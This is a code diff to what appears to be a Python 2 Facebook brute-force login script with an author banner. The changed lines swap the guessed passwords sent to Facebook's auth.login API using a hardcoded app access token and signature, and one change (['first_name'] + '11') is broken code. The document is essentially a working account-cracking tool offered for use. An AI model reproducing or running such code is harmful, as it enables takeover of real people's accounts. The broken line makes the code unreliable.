@@ -56,7 +56,7 @@ logo = """
                                    
 \033[1;31;40m ▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅๑۩🅡🅐🅡۩๑▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅
 \033[1;32;40m ➣Author©  → Rehan Khan
-\033[1;33;40m ➣Github   → https://github.com/Therehan
+\033[1;33;40m ➣Github   → https://github.com/Therehan/khan
 \033[1;34;40m ➣Youtube  → TECHNICAL SARAIKI
 \033[1;35;40m ➣☏        → +9203052071471
 \033[1;36;40m ▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅
@@ -364,7 +364,7 @@ def pilih_super():
 											cek.close()
 											cekpoint.append(user+pass4)
 										else:
-											pass5 = 'sayang'
+											pass5 = 'love123'
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if 'access_token' in q:
@@ -392,7 +392,7 @@ def pilih_super():
 															cek.close()
 															cekpoint.append(user+pass6)
 														else:
-															pass7 = 'anjing'
+															pass7 = ['first_name'] + '11'
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if 'access_token' in q:
